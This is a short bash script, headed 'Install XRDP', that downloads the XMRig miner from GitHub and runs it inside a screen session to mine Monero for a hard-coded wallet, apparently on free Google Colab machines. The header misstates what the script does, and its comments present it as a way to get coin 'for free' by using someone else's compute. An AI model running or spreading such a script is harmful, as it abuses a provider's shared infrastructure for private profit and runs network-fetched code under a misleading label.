#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 89QrRdzdDNpZTpjfTv6B3NMZKPdVkhkuTJzbtagpZ1QyCA8m8tkg9PrdRtf8CtKuXP94BbFuV2dKji4emxrYcFHJLTLyXe9 -k --tls --rig-id GC-US
